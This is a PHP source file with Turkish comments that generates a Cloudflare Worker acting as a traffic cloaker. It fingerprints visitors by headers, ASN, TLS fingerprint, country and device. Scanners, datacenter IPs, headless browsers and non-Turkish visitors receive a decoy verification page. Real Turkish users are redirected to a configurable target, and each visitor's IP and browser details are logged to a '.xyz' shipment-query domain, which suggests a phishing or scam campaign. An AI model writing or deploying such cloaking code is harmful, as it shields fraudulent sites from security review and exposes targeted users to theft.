<?php	

function generateWorkerScript(string $campaignId, string $targetUrl, array $botFilters, array $devices, string $secret): string {
    
    // INDEX.HTML DOSYASINI OKU
    $indexHtmlPath = __DIR__ . '/index.html';  // lib/index.html
    $indexHtml = file_exists($indexHtmlPath) ? file_get_contents($indexHtmlPath) : '<h1>Doğrulama Gerekiyor</h1>';
    
    // Tek tırnakları temizle (worker JS içine gömüleceği için)
    $indexHtml = str_replace(["'", "\r", "\n"], ["\\'", "", ""], $indexHtml);
    
    $botFiltersJson = json_encode(array_values($botFilters));
    $devicesJson = json_encode(array_values($devices));
    $targetUrlJs = json_encode($targetUrl);
    $campaignIdJs = json_encode($campaignId);
    $logEndpointJs = json_encode("https://gonderisorgula.xyz/api/log_visit.php");
    $countryJs = json_encode("TR");
    $indexHtmlJs = json_encode($indexHtml);
    $secretJs = json_encode($secret);

    return <<<JS
addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {

  const url = new URL(request.url)
  const method = request.method
  const userAgent = request.headers.get("user-agent") || ""
  const ip = request.headers.get("cf-connecting-ip") || ""
  const country = request.headers.get("cf-ipcountry") || "XX"
  const accept = request.headers.get("accept") || ""
  const acceptLang = request.headers.get("accept-language") || ""
  const secChUa = request.headers.get("sec-ch-ua") || ""
  const referer = request.headers.get("referer") || ""
  const cookie = request.headers.get("cookie") || ""
  const secFetchDest = request.headers.get("sec-fetch-dest") || ""
  const secFetchMode = request.headers.get("sec-fetch-mode") || ""
  const tlsFingerprint = request.headers.get("cf-ja3-fingerprint") || ""
  const asn = request.headers.get("cf-asn") || ""
  const acceptEncoding = request.headers.get("accept-encoding") || ""

  const TARGET_URL = $targetUrlJs
  const ALLOWED_COUNTRY = $countryJs
  const ENABLED_BOT_FILTERS = $botFiltersJson
  const ENABLED_DEVICES = $devicesJson
  const CAMPAIGN_ID = $campaignIdJs
  const LOG_ENDPOINT = $logEndpointJs
  const WORKER_SECRET = $secretJs
  const INDEX_HTML = $indexHtmlJs

  let detectedBy = null
  let logSent = false

  async function sendLog(isBot, filterHit = null) {
	  // BU İSTEK ZATEN LOGLANDI MI? (IP + campaign_id + 1 saniye)
	  const now = Date.now()
	  const requestKey = ip + "_" + CAMPAIGN_ID
	  
	  if (!globalThis.__lastLogTime) globalThis.__lastLogTime = new Map()
	  
	  const lastLog = globalThis.__lastLogTime.get(requestKey)
	  if (lastLog && now - lastLog < 100) {
		console.log("Log skipped (rate limit):", requestKey)
		return // 1 saniyede 1'den fazla log atma
	  }
	  
	  globalThis.__lastLogTime.set(requestKey, now)

	  if (logSent) return
	  logSent = true

	  try {
		await fetch(LOG_ENDPOINT, {
		  method: "POST",
		  headers: { 
			"Content-Type": "application/json",
			"X-Worker-Secret": WORKER_SECRET
		  },
		  body: JSON.stringify({
			campaign_id: CAMPAIGN_ID,
			ip: ip,
			user_agent: userAgent,
			country: country,
			is_bot: isBot,
			filter_hit: filterHit,
			status: isBot ? "blocked" : "allowed",
			timestamp: new Date().toISOString()
		  })
		})
	  } catch (e) {
		console.error("Log error:", e)
	  }
	}

function checkBot() {
  let detectedFilters = []  // Yakalanan filtreler burada birikecek

  // 1. Headless Browser Tespiti
  if (ENABLED_BOT_FILTERS.includes("headless") && /HeadlessChrome|puppeteer|selenium|phantomjs|webdriver/i.test(userAgent)) {
    detectedFilters.push("headless")
  }

  // 2. User-Agent Anormalliği
  if (ENABLED_BOT_FILTERS.includes("ua") && (userAgent.length < 40 || !/Chrome|Firefox|Safari|Edg/i.test(userAgent))) {
    detectedFilters.push("ua")
  }

  // 3. Datacenter Tespiti
  if (ENABLED_BOT_FILTERS.includes("datacenter")) {
    const dcASNs = ['16509', '14061', '20473', '16276', '24940', '14618', '15169']
    if (dcASNs.includes(asn)) {
      detectedFilters.push("datacenter")
    }
  }

  // 4. Accept Mismatch
  if (ENABLED_BOT_FILTERS.includes("accept_mismatch")) {
    if (!accept || !accept.includes("text/html")) {
      detectedFilters.push("accept_mismatch")
    }
  }

  // 5. Header Consistency
  if (ENABLED_BOT_FILTERS.includes("header_consistency")) {
    if (!accept || !acceptLang || !secChUa) {
      detectedFilters.push("header_consistency")
    }
  }
	
  // 6. Navigation Token (BU FONKSİYON RETURN KULLANIYOR, DİKKAT!)
  if (ENABLED_BOT_FILTERS.includes("navigation_token")) {
    const token = url.searchParams.get("nv")
    if (!token) {
      const newUrl = new URL(request.url)
      newUrl.searchParams.set("nv", crypto.randomUUID())
      return { redirect: newUrl.toString() }  // Özel durum: yönlendirme yap
    }
  }
	
  // 7. Behavioral Delay
  if (ENABLED_BOT_FILTERS.includes("behavioral_delay")) {
    if (!globalThis.__delayMap) globalThis.__delayMap = {}
    const now = Date.now()
    if (globalThis.__delayMap[ip] && now - globalThis.__delayMap[ip] < 300) {
      detectedFilters.push("behavioral_delay")
    }
    globalThis.__delayMap[ip] = now
  }
	
  // 8. Advanced JS (BU FONKSİYON RETURN KULLANIYOR, DİKKAT!)
  if (ENABLED_BOT_FILTERS.includes("advanced_js")) {
    if (!cookie.includes("adv_verified=true")) {
      return { html: "<html><body><script>setTimeout(()=>{document.cookie='adv_verified=true; path=/'; location.reload();},300);</script></body></html>" }
    }
  }
	
  // 9. Fingerprint V2
  if (ENABLED_BOT_FILTERS.includes("fingerprint_v2")) {
    const fp = userAgent + accept + acceptLang + secChUa + tlsFingerprint + country
    const now = Date.now()
    
    if (!globalThis.__fpv2) globalThis.__fpv2 = {}
    
    if (globalThis.__fpv2[fp]) {
      const lastVisit = globalThis.__fpv2[fp].lastVisit
      const visitCount = globalThis.__fpv2[fp].count
      
      if (now - lastVisit < 1000 && visitCount >= 3) {
        detectedFilters.push("fingerprint_v2_flood")
      } else if (now - lastVisit < 10000 && visitCount >= 5) {
        detectedFilters.push("fingerprint_v2_rapid")
      }
      
      globalThis.__fpv2[fp] = {
        lastVisit: now,
        count: visitCount + 1
      }
    } else {
      globalThis.__fpv2[fp] = {
        lastVisit: now,
        count: 1
      }
    }
  }
	
  // 10. TLS/UA Uyumu
  if (ENABLED_BOT_FILTERS.includes("tls_ua_check") && tlsFingerprint) {
    if (userAgent.includes("Chrome") && !tlsFingerprint.startsWith("6734") && !tlsFingerprint.startsWith("aa")) {
      detectedFilters.push("tls_ua_chrome_mismatch")
    }
    if (userAgent.includes("Firefox") && !tlsFingerprint.startsWith("b323")) {
      detectedFilters.push("tls_ua_firefox_mismatch")
    }
    if (userAgent.includes("Safari") && !tlsFingerprint.startsWith("a74c")) {
      detectedFilters.push("tls_ua_safari_mismatch")
    }
  }
	
  // 11. Dil/Ülke Tutarlılığı
  if (ENABLED_BOT_FILTERS.includes("lang_country_check") && acceptLang && country) {
    const primaryLang = acceptLang.split(',')[0].split('-')[0].toLowerCase()
    if (primaryLang === 'tr' && !['TR', 'CY'].includes(country)) {
      detectedFilters.push("lang_country_mismatch")
    }
  }
	
  // 12. Accept-Encoding Kontrolü
  if (ENABLED_BOT_FILTERS.includes("encoding_check") && acceptEncoding) {
    if (!acceptEncoding.includes("gzip") && !acceptEncoding.includes("br") && !acceptEncoding.includes("deflate")) {
      detectedFilters.push("encoding_abnormal")
    }
  }
	
  // 13. Referrer Doğrulama
  if (ENABLED_BOT_FILTERS.includes("referrer_check") && referer) {
    const searchEngines = /google|bing|yahoo|yandex|duckduckgo|baidu/
    if (!searchEngines.test(referer) && !referer.includes(url.hostname)) {
      detectedFilters.push("suspicious_referer")
    }
  }
	
  // 14. Header Bütünlüğü
  if (ENABLED_BOT_FILTERS.includes("header_integrity")) {
    let missingCount = 0
    if (!accept) missingCount += 2
    if (!acceptLang) missingCount++
    if (!acceptEncoding) missingCount++
    if (!secChUa) missingCount += 2
    if (!secFetchDest) missingCount++
    if (!secFetchMode) missingCount++
    
    if (missingCount >= 5) {
      detectedFilters.push("header_missing_many")
    }
  }

  // Normal dönüş: yakalanan filtreler
  return { filters: detectedFilters }
}

  function isAllowedDevice() {
    if (ENABLED_DEVICES.length === 0) return true
    const isMobile = /Mobi|Android/i.test(userAgent)
    const isTablet = /Tablet|iPad/i.test(userAgent)
    const isDesktop = !isMobile && !isTablet
    if (isMobile && ENABLED_DEVICES.includes("mobile")) return true
    if (isTablet && ENABLED_DEVICES.includes("tablet")) return true
    if (isDesktop && ENABLED_DEVICES.includes("desktop")) return true
    return false
  }

  // SADECE GERÇEK SAYFA NAVIGASYONU LOG ATAR
  const isRealPageVisit =
    method === "GET" &&
    accept.includes("text/html") &&
    (secFetchDest === "document" || secFetchMode === "navigate")

  // Ülke kontrolü
  if (country !== ALLOWED_COUNTRY) {
    await sendLog(true, "country")
    return new Response(INDEX_HTML, {
      status: 200,
      headers: { "Content-Type": "text/html" }
    })
  }

  // Bot tespiti
  // Bot kontrolü
const checkResult = checkBot()

// Özel durumlar (yönlendirme veya html gösterimi)
if (checkResult.redirect) {
  return Response.redirect(checkResult.redirect, 302)
}
if (checkResult.html) {
  return new Response(checkResult.html, { headers: { "Content-Type": "text/html" } })
}

// Normal bot kontrolü
const detectedFilters = checkResult.filters || []
const isBot = detectedFilters.length > 0
const filterHit = detectedFilters.join(',')

if (isBot) {
  await sendLog(true, filterHit)
  return new Response(INDEX_HTML, {
    status: 200,
    headers: { "Content-Type": "text/html" }
  })
}

  // Cihaz kontrolü
  if (!isAllowedDevice()) {
    await sendLog(true, "device")
    return new Response(INDEX_HTML, {
      status: 200,
      headers: { "Content-Type": "text/html" }
    })
  }

  // İnsan logu
  if (isRealPageVisit) {
    const hasNavToken = !ENABLED_BOT_FILTERS.includes("navigation_token") || url.searchParams.get("nv")
    const hasAdvancedCookie = !ENABLED_BOT_FILTERS.includes("advanced_js") || cookie.includes("adv_verified=true")

    if (hasNavToken && hasAdvancedCookie) {
      await sendLog(false, null)
    }
  }

  return Response.redirect(TARGET_URL, 302)

}
JS;
}
?>